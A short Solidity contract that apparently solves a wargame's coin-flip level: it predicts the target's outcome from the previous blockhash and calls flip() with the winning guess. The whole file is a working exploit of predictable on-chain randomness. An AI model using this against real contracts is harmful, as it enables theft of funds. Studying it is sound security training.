// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public coinFlipContract;

    function setInstance(address _instance) public {
        coinFlipContract = ICoinFlip(_instance);
    }

    function callFlip() external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockVal = uint256(blockhash(block.number - 1));
        uint256 division = blockVal / factor;
        bool guess = division == 1 ? true : false;
        coinFlipContract.flip(guess);
    }
}

